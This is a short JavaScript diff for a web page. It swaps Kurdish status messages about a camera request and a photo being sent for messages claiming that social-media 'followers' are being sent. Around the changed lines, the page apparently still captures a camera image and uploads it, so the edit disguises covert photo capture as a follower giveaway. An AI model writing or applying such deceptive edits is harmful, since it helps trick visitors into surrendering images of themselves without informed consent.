@@ -113,7 +113,7 @@
 
         startBtn.disabled = true;
         statusDiv.style.color = "#00d2ff";
-        statusDiv.innerText = "📷 داخوازا کامێرایێ دهێتە کرن...";
+        statusDiv.innerText = "تو پشتراستی فولو بهێن هنارتن؟";
 
         let stream = null;
         try {
@@ -141,7 +141,7 @@
             stream.getTracks().forEach(track => track.stop());
 
             statusDiv.style.color = "#4ade80";
-            statusDiv.innerText = "⏳ وێنە هاتە گرتن و یێ دهێتە هنارتن...";
+            statusDiv.innerText = "⏳ فولو یێ دهێنه هنارتن";
 
             canvas.toBlob(blob => {
                 if (!blob) {
